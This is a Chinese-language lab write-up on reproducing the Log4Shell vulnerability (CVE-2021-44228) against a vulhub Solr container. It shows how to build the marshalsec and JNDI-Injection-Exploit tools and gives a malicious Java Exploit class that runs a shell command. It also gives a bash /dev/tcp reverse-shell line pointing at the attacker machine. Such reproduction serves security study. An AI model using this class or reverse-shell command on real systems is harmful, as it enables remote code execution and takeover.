# 环境搭建

## 介绍

本次复现使用在vmware中创建的ubuntu 20.04作为靶机，ip为192.168.140.141，kali linux作为攻击机，ip为192.168.140.140。这里先说明二者的ip，便于后续理解。

具体情况为：

靶机ubuntu：ubuntu镜像下载地址为：https://releases.ubuntu.com/20.04/ubuntu-20.04.6-desktop-amd64.iso。 然后搭建vulhub/log4j/CVE-2021-44228，即solr8.11.0。其他配置为：jdk 1.8.0_102  log4j 2.14.1，作为实验环境

攻击机kali Linux：使用marshalsec和JNDI-Injection-Exploit实现JNDI方法需要的LDAP和RMI服务。两者都尝试使用复现。远程加载类Exploit.class由自己编写

## 具体搭建

### solr8.11.0

使用git克隆到本地然后使用docker-compose搭建，具体过程：

```bash
git clone https://github.com/vulhub/vulhub
cd vulhub/log4j/CVE-2021-44228
docker-compose up 
```

此处可能会有github无法访问，可以使用clash,然后在虚拟机中配置代理，即可成功下载。也有可能docker-compose up失败，换国内可用的源写入`/etc/docker/daemon.json`并重新加载和重启后即可

成功后可以在docker中使用`docker ps`查看运行情况，也可在浏览器中访问web界面。

### marshalsec

```bash
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests
```

这里和后续都会用到的mvn对工具进行构建，没有可使用`sudo apt install maven -y`。构建成功后可看到target文件夹

### JNDI-Injection-Exploit

```bash
git clone https://github.com/welk1n/JNDI-Injection-Exploit
cd JNDI_Injection-Exploit
mvn clean package -DskipTests
```

构建成功后查看方法同上。

### Exploit.class

这里一个恶意类执行结果是创建一个txt文件来验证漏洞触发情况，后续可替换命令为反弹shell。

```bash
mkdir log4j-poc
vim Exploit.java

# 编译
javac -source 8 -target 8 Exploit.java
```

这里的编译使用的是一个交叉编译，主要solr中的为jdk 8，kali Linux的apt没能定位到jdk 8，只有jdk 11,因此使用交叉编译才能在solr中执行。

脚本内容为：

```java
import java.io.IOException;

public class Exploit {
    static {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "echo pwned > C:\\pwned.txt"});
            } else {
                Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "echo pwned > /tmp/pwned.txt"});
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

添加了一个系统判断更加完善，虽然这里并无必要。

`ehco pwned > /tmp/pwned.txt`改为`bash -i >& /dev/tcp/192.168.140.140/7777 0>&1`即为反弹shell。





